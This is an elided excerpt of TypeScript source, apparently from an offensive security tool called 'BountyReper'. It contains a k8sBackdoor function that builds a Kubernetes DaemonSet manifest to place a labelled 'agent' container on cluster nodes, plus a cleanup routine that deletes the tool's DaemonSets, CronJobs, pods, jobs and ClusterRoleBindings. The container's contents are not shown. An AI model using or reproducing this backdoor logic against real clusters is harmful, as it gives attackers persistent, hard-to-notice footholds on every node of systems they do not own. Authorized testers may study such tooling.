...
const PROGRAMS = {
  ...
  cleanup_k8s: {
    description:
      "Remove all BountyReper-created Kubernetes resources (by label app=bountyreper): DaemonSets, CronJobs, ClusterRoleBindings, Pods. ALWAYS run before leaving",
...
async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (type === "daemonset") {
    ...
    const manifest = JSON.stringify({
      apiVersion: "apps/v1",
      kind: "DaemonSet",
      metadata: { name, namespace: ns, labels: { app: "bountyreper" } },
      spec: {
        selector: { matchLabels: { app: "bountyreper", component: name } },
        template: {
          metadata: { labels: { app: "bountyreper", component: name } },
          spec: {
            containers: [
              {
                name: "agent",
...
async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> {
  ...
  const output: string[] = [
    dryRun
      ...
      : "[*] Cleaning up BountyReper Kubernetes resources...\n",
  ]
  let cleaned = 0

  const resources = ["daemonsets", "cronjobs", "pods", "jobs"]
  for (const res of resources) {
    const list = await kc(["get", res, "--all-namespaces", "-l", "app=bountyreper"], kubeconfig, ctx, timeout)
  ...
  const crbs = await kc(["get", "clusterrolebindings", "-l", "app=bountyreper"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    for (const b of items) {
      if (dryRun) {
